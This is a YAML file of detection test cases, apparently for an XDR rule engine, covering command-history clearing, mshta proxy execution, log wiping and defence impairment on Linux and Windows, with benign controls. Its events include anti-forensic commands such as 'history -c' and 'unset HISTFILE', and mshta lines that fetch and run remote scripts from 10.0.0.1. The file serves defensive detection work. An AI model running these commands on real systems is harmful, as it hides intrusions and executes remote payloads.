technique: T1070.003
name: Clear Command History
cases:
  - name: history -c
    source: atomic T1070.003
    class: 1007
    os: linux
    event:
      process:
        name: bash
        cmd_line: "history -c"

  - name: bash -c 内 history -c
    source: 入侵后反取证常见写法
    class: 1007
    os: linux
    event:
      process:
        name: bash
        cmd_line: "bash -c 'history -c; exit'"

  - name: celery 队列名含 history（良性对照）
    technique: T1070.003
    source: 生产误报 2026-11-07（audit-analyzer 的 audit_history 队列）
    class: 1007
    os: linux
    expect: undetected
    event:
      process:
        name: celery
        cmd_line: "/usr/local/bin/python3.12 /usr/local/bin/celery -A analyzer.app worker -n history@%h -Q audit_history -c 1 --loglevel=info"

  - name: 清空 bash_history（重定向）
    source: atomic T1070.003
    class: 1007
    os: linux
    event:
      process:
        name: bash
        cmd_line: 'echo "" > ~/.bash_history'

  - name: unset HISTFILE
    source: atomic T1070.003
    class: 1007
    os: linux
    event:
      process:
        name: bash
        cmd_line: "unset HISTFILE"

  - name: HISTFILE 指向 /dev/null
    source: atomic T1070.003
    class: 1007
    os: linux
    event:
      process:
        name: ln
        cmd_line: "ln -sf /dev/null ~/.bash_history"

  - name: mshta 执行远程 hta
    technique: T1218.005
    source: atomic T1218.005
    class: 1007
    os: windows
    event:
      process:
        name: mshta.exe
        file:
          path: "C:\\Windows\\System32\\mshta.exe"
        cmd_line: "mshta.exe http://10.0.0.1/payload.hta"

  - name: mshta javascript 协议
    technique: T1218.005
    source: atomic T1218.005
    class: 1007
    os: windows
    event:
      process:
        name: mshta.exe
        file:
          path: "C:\\Windows\\System32\\mshta.exe"
        cmd_line: 'mshta.exe javascript:a=GetObject("script:http://10.0.0.1/a.sct").Exec();close();'

  - name: wevtutil 清空 Security 日志（1102 日志清空事件）
    technique: T1070.001
    source: atomic T1070.001
    class: 3002
    os: windows
    event:
      activity_id: 13
      status_id: 1
      user:
        name: attacker
      log_cleared: true

  - name: 删除 Run 键自启动值（擦痕迹，快照 diff 删除事件带旧值）
    technique: T1070
    source: atomic T1547.001 反向操作
    class: 201002
    os: windows
    event:
      activity_id: 4
      reg_key:
        path: "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Atomic"
      reg_value:
        data: "C:\\Users\\Public\\evil.exe"

  - name: 删除恶意服务（快照 diff 删除事件）
    technique: T1070
    source: atomic T1543.003 反向操作
    class: 201002
    os: windows
    event:
      activity_id: 4
      reg_key:
        path: "HKLM\\SYSTEM\\CurrentControlSet\\Services\\atomic"
      reg_value:
        data: "ImagePath=C:\\Users\\Public\\evil.exe; Start=2"

  - name: 删除 Startup 目录快捷方式
    technique: T1070.004
    source: atomic T1070.004
    class: 1001
    os: windows
    event:
      activity_id: 4
      file:
        path: "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.lnk"

  - name: 删除计划任务文件
    technique: T1070.004
    source: atomic T1070.004
    class: 1001
    os: windows
    event:
      activity_id: 4
      file:
        path: "C:\\Windows\\System32\\Tasks\\atomic"

  - name: 删除普通下载文件（良性对照）
    technique: T1070.004
    source: 良性对照
    class: 1001
    os: windows
    expect: undetected
    event:
      activity_id: 4
      file:
        path: "C:\\Users\\user\\Downloads\\old-build.zip"

  - name: 新增 Defender 排除路径（快照 diff 注册表事件）
    technique: T1562.001
    source: atomic T1562.001
    class: 201002
    os: windows
    event:
      activity_id: 1
      reg_key:
        path: "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\Public"
      reg_value:
        data: "0"

  - name: 停止 EventLog 服务瞎眼（服务快照 State 翻转）
    technique: T1562.001
    source: atomic T1562.001
    class: 201002
    os: windows
    event:
      activity_id: 3
      reg_key:
        path: "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog"
      reg_value:
        data: "ImagePath=C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted; Start=2; State=Stopped"

  - name: auditpol 关闭登录子类别的成功与失败审计（4719，实机回放第四轮的原始事件）
    technique: T1562.002
    source: atomic T1562.002
    class: 3002
    os: windows
    event:
      activity_id: 15
      status_id: 1
      user:
        name: "OPENXDR-TESTWIN$"
      policy_category: "%%8272"
      policy_subcategory: "%%12288"
      policy_changes: "%%8448, %%8450"

  - name: auditpol 只关闭失败审计（4719 失败移除）
    technique: T1562.002
    source: atomic T1562.002
    class: 3002
    os: windows
    event:
      activity_id: 15
      status_id: 1
      user:
        name: attacker
      policy_category: "%%8274"
      policy_subcategory: "%%12800"
      policy_changes: "%%8450"

  - name: auditpol 开启审计（4719 成功/失败添加，良性对照）
    technique: T1562.002
    source: 实机回放第四轮的恢复动作
    class: 3002
    os: windows
    expect: undetected
    event:
      activity_id: 15
      status_id: 1
      user:
        name: "OPENXDR-TESTWIN$"
      policy_category: "%%8272"
      policy_subcategory: "%%12288"
      policy_changes: "%%8449, %%8451"
